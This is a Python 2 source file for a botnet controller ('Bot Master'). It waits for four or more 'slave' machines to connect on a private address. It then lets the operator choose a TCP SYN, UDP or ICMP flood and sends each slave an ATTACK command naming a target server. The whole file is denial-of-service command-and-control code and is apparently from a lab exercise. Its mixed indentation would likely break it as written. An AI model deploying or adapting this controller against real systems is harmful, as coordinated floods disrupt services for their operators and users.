import time, datetime, sys, re,ntplib
from socket import *  #importing the socket library for network connections
from time import ctime, time

##Setting up variables
SERVER_HOST = '10.0.0.7'
MS_LISTEN_HOST = '10.0.0.2'
MS_LISTEN_PORT = 8081

class Master():
  def __init__(self, sock=None):
    if sock is None:
      self.sock = socket(AF_INET, SOCK_STREAM)
    else:
      self.sock = sock
    self.slaves = {}

    self.count=0
    # The server to be attacked
    self.server_ip = SERVER_HOST
   

    # get ntp times
    self.ntp_res = time()

  def listenConnections(self, port):
    print "Listening for connections"
    self.sock.bind((MS_LISTEN_HOST, port))
    self.sock.listen(5)

  def acceptConnections(self):
    conn, addr = self.sock.accept()
    print('Accepting connection {0}'.format(addr))
    msg_buf = conn.recv(64)
    if len(msg_buf) > 0:
      #print(msg_buf)
      self.count+=1
      print "Slave "+str(self.count)+" connected at: "+msg_buf
    conn.send('Connected to Bot Master at: {0}'.format(ctime(self.ntp_res)))
    self.slaves[addr] = conn

  def launchAttack(self):
	  
	  attack = input ("--------------------------------------\n"
				"Choose the type of attack :\n"
				"1 for TCP SYN FLOOD \n"
				"2 for UDP FLOOD \n" 
				"3 for ICMP FLOOD \n"
			  "--------------------------------------\n"
				"Answer : ")
	  for slave_addr, conn in self.slaves.iteritems():
	  	ip = slave_addr[0]
		print ip
	  	# get ntp times
	   	ntp_res = time()
	   	conn.send('ATTACK {0} {1} {2} {3}'.format(self.server_ip,ip,ntp_res,attack))
    	  print "All Slaves ready to ATTACK!!!"

  def closeConnection(self):
    self.sock.close()

if __name__ == '__main__':
    port = MS_LISTEN_PORT
    masterServer = Master()
    masterServer.listenConnections(port)
    while 1:
      masterServer.acceptConnections()
      if len(masterServer.slaves) >= 4:
        break
    masterServer.launchAttack()
